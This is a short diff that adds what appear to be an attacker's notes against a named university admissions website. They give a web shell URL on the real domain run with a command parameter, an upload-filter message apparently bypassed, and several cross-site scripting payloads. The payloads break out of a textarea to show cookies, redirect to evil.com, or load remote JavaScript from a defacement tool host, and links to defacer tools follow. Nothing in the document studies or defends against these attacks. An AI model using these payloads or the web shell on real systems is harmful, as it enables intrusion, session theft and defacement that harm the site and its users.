@@ -1,0 +1,20 @@
+https://admission.ewubd.edu/profile_picture/
+
+https://admission.ewubd.edu/profile_picture/shell.php?cmd=id
+
+Only image/jpeg or image/pjpeg or image/gif files may be uploaded.
+
+</textarea></td><script>alert("XSS injected By D0LPH1N")</script>
+</textarea></td><a href="https://evil.com"></a>
+
+</textarea></td><script>window.location.href="https://evil.com"</script>
+
+
+</textarea></td><script>alert(document.cookie)</alert>
+
+
+<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/JSKATYH2S72OH"></script>
+
+
+https://tools.zone-xsec.com/defacer/jso
+https://jso-tools.z-x.my.id/
